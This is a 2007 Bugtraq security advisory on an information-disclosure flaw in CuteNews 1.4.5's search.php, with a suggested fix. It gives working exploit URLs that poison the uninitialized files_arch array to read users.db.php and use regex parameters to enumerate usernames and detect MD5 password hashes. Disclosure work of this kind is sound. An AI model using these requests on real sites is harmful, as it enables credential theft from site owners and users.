
Date: 23 Dec 2007 21:39:58 -0000
From: come2waraxe@...oo.com
To: bugtraq@...urityfocus.com
Subject: [waraxe-2007-SA#060] - Sensitive info disclosure in CuteNews <= 1.4.5

[waraxe-2007-SA#060] - Sensitive info disclosure in CuteNews <= 1.4.5
=====================================================================

Author: Janek Vind "waraxe"
Date: 24. December 2007
Location: Estonia, Tartu
Web: http://www.waraxe.us/advisory-60.html


Vulnerable software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Cute news is a powerful and easy to use news management system that
uses flat files to store its database. It supports commenting,
archives, search function, file upload management, backup & restore,
IP banning, flood protection ...

Homepage: http://cutephp.com/


Vulnerabilities:  Sensitive info disclosure in "search.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Let's look @ "search.php" source code ~line 158:

-------------------------->[source code]<----------------------------
if($dosearch == "yes")
{
...
	$story = trim($story);
	
	if($search_in_archives){
	...
		$files_arch[] = "$cutepath/data/archives/$file";
	...
	$files_arch[] = "$cutepath/data/news.txt";
------------------------->[/source code]<----------------------------


Hmm, let's see - "$files_arch" array is uninitialized before using
for file pathes storing. How about good old variable poisoning?


http://localhost/cutenews.1.4.5/search.php?dosearch=yes&files_arch[]=waraxe

and nice error message appears:

Warning: file(waraxe) [function.file]: failed to open stream: 
No such file or directory in
C:\apache_wwwroot\cutenews.1.4.5\search.php on line 188

So it seems possible to trick this search script for opening arbitrary
local files. How about "users.db.php", which contains user credentials?

Testing:
http://localhost/cutenews.1.4.5/search.php?dosearch=yes&files_arch[]=./data/users.db.php

No error messages! Search script will open user database file and will
try to parse it. Is it exploitable?

Let's have second look @ vulnerable script source:

-------------------------->[source code]<----------------------------
foreach($files_arch as $file)
{
...
$all_news_db = file("$file");
foreach($all_news_db as $news_line){
	$news_db_arr = explode("|",$news_line);
	...
	if($title and @preg_match("/$title/i", "$news_db_arr[2]")){ $ftitle = TRUE; }
	if($user  and @preg_match("/\b$user\b/i", "$news_db_arr[1]")){ $fuser = TRUE; }
	if($story and (@preg_match("/$story/i", "$news_db_arr[4]") ...
...
if($fdate and $ftitle and $fuser and $fstory){ $found_arr[$news_db_arr[0]] = $archive; }
...
echo"<br /><b>Founded News articles [". count($found_arr)."]:</b><br />";
------------------------->[/source code]<----------------------------

Title, user and story variables are coming directly from GPC, so another
insecurity feature - regex manipulation - is available for us to exploit.

Let's assume, that username "john" is non valid and "waraxe" is valid
username in current Cutenews installation.

http://localhost/cutenews.1.4.5/search.php?dosearch=yes&title=waraxe&files_arch[]=./data/users.db.php

... and we see "Founded News articles [1]"
Now let's try nonexistent user:
http://localhost/cutenews.1.4.5/search.php?dosearch=yes&title=john&files_arch[]=./data/users.db.php
... and response is different: "Founded News articles [0]"
We have just seen, how username can be "pinged" from database file.

Now, let's get more serious:

http://localhost/cutenews.1.4.5/search.php?dosearch=yes&story=^[a-f0-9]{32}$&files_arch[]=./data/users.db.php

... and we see "Founded News articles [5]", which shows users count
in database with standard md5 hashes.

Sorry about long and boring storytelling, i will make it short now:
by using security vulnerabilities described above any attacker can
retrieve usernames and password md5 hashes from userdata file within
minutes. I have written two PoC scripts, "cuteuser.php" and "cutemd5.php",
which will allow to enumerate usernames and fetch password hashes from
most Cutenews targets as for today. Exploitable is newest version 1.4.5,
but older versions are vulnerable too, including CuteNews v1.3.1

Exploits are available at http://www.waraxe.us/tools/

Questions about this advisory or PoC scripts can be asked in forum:

http://www.waraxe.us/forums.html

//-----> See ya soon and have a nice day ;) <-----//

How to fix:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Initialize variables before use! In this way php variable poisoning
related security issues can be mitigated.


Greetings:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Greets to ToXiC, LINUX, y3dips, Sm0ke, Heintz, slimjim100, Chb
and anyone else who know me!
Greetings to Raido Kerna.
Tervitusi Torufoorumi rahvale!

Contact:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

come2waraxe@...oo.com
Janek Vind "waraxe"

Homepage: http://www.waraxe.us/


Shameless advertise:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Biography Database - http://www.biosaxe.com/
Old books online - http://www.oldreadings.com/

---------------------------------- [ EOF ] --------------------------
